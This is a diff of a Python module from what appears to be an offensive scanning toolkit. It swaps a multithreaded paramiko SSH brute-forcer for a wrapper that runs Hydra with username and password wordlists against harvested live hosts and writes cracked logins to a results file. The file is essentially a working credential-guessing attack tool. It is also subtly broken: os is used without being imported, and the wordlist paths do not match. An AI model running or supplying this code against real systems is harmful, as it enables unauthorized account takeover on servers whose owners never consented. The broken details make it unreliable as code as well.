@@ -1,110 +1,78 @@
-import paramiko
-import os
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from tqdm import tqdm
-import time
-
-# Base directory for output and wordlists
-OUTPUT_DIR = "results/valid_logins/bruteforce_results"
-WORDLIST_DIR = "wordlists/ssh"
-os.makedirs(OUTPUT_DIR, exist_ok=True)
-os.makedirs(WORDLIST_DIR, exist_ok=True)
-
-# Log file for successful attempts
-SUCCESS_LOG = os.path.join(OUTPUT_DIR, "successful_logins.txt")
-
-# File containing valid SSH servers
-VALID_SSH_SERVERS_DIR = "results/valid_hosts"
-
-def ssh_connect(host, username, password, port=22, timeout=5):
-    """
-    Attempt to connect to an SSH server using given credentials.
-    """
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(host, port, username, password, timeout=timeout)
-        return True
-    except paramiko.AuthenticationException:
-        return False  # Invalid credentials
-    except paramiko.SSHException as e:
-        print(f"[ERROR] SSH Exception for {host}: {e}")
-        return False
-    except Exception as e:
-        print(f"[ERROR] Connection to {host} failed: {e}")
-        return False
-    finally:
-        client.close()
-
-def bruteforce_ssh(targets, usernames, passwords, max_threads=10):
-    """
-    Perform SSH bruteforcing on a list of targets with given usernames and passwords.
-    """
-    with ThreadPoolExecutor(max_threads) as executor:
-        futures = []
-        for target in targets:
-            for username in usernames:
-                for password in passwords:
-                    futures.append(
-                        executor.submit(ssh_connect, target, username, password)
-                    )
-
-        for future in tqdm(as_completed(futures), total=len(futures), desc="Bruteforcing SSH"):
-            try:
-                if future.result():
-                    target, username, password = future.args
-                    print(f"[SUCCESS] {target} - {username}:{password}")
-            except Exception as e:
-                print(f"[ERROR] Error during bruteforcing: {e}")
+from globals import global_live_hosts  # Import global variables
+import subprocess
 
 
 def load_wordlists():
     """
-    Load username and password wordlists from the 'wordlists' directory.
+    Load usernames and passwords from the wordlists directory.
 
-    Returns:
-        tuple: Lists of usernames and passwords.
+    :return: Tuple (usernames, passwords)
     """
     wordlist_dir = "wordlists"
-    username_file = os.path.join(wordlist_dir, "ssh_usernames.txt")
-    password_file = os.path.join(wordlist_dir, "ssh_passwords.txt")
+    username_file = f"{wordlist_dir}/ssh_usernames.txt"
+    password_file = f"{wordlist_dir}/ssh_passwords.txt"
 
-    if not os.path.exists(username_file) or not os.path.exists(password_file):
-        print("[ERROR] Missing wordlists in the 'wordlists' directory.")
-        print("Ensure both 'ssh_usernames.txt' and 'ssh_passwords.txt' exist.")
-        return [], []
+    usernames, passwords = [], []
 
-    with open(username_file, "r") as uf, open(password_file, "r") as pf:
-        usernames = [line.strip() for line in uf if line.strip()]
-        passwords = [line.strip() for line in pf if line.strip()]
+    try:
+        if not os.path.exists(username_file):
+            raise FileNotFoundError(f"[ERROR] Username wordlist not found: {username_file}")
 
-    if not usernames:
-        print("[ERROR] The username wordlist is empty.")
-        return [], []
+        if not os.path.exists(password_file):
+            raise FileNotFoundError(f"[ERROR] Password wordlist not found: {password_file}")
 
-    if not passwords:
-        print("[ERROR] The password wordlist is empty.")
-        return [], []
+        with open(username_file, "r") as uf:
+            usernames = [line.strip() for line in uf if line.strip()]
+
+        with open(password_file, "r") as pf:
+            passwords = [line.strip() for line in pf if line.strip()]
+
+    except Exception as e:
+        print(f"[ERROR] Failed to load wordlists: {e}")
 
     print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
     return usernames, passwords
 
-def validate_ssh_server(host, port=22, timeout=5):
+
+def bruteforce_ssh(targets, usernames, passwords, max_threads=1):
     """
-    Validate if a server is running SSH.
+    Perform SSH brute force attack using Hydra.
+
+    :param targets: List of target hosts to attack
+    :param usernames: List of usernames to test
+    :param passwords: List of passwords to test
+    :param max_threads: Maximum number of concurrent threads
     """
-    try:
-        sock = socket.create_connection((host, port), timeout=timeout)
-        banner = sock.recv(1024).decode("utf-8", errors="ignore")
-        sock.close()
-        return "SSH" in banner
-    except Exception as e:
-        print(f"[INFO] Skipping {host}: {e}")
-        return False
+    results_file = "results/cracked.txt"
+    print("[INFO] Starting brute force attack...")
 
+    for target in targets:
+        print(f"[INFO] Targeting {target}...")
 
-if __name__ == "__main__":
-    # Load wordlists and bruteforce valid SSH servers
-    usernames, passwords = load_wordlists()
-    bruteforce_ssh(usernames, passwords, max_threads=20)
+        try:
+            # Call Hydra for brute forcing
+            subprocess.run(
+                [
+                    "hydra",
+                    "-L",
+                    "wordlists/usernames.txt",
+                    "-P",
+                    "wordlists/passwords.txt",
+                    target,
+                    "ssh",
+                    "-o",
+                    results_file,
+                    "-t",
+                    str(max_threads),
+                    "-vV",
+                ],
+                check=True,
+            )
+            print(f"[INFO] Results saved to {results_file}")
 
+        except FileNotFoundError:
+            print("[ERROR] Hydra is not installed or not found in PATH. Please install Hydra.")
+        except subprocess.CalledProcessError:
+            print(f"[ERROR] Hydra failed to brute force {target}.")
+        except Exception as e:
+            print(f"[ERROR] Unexpected error: {e}")
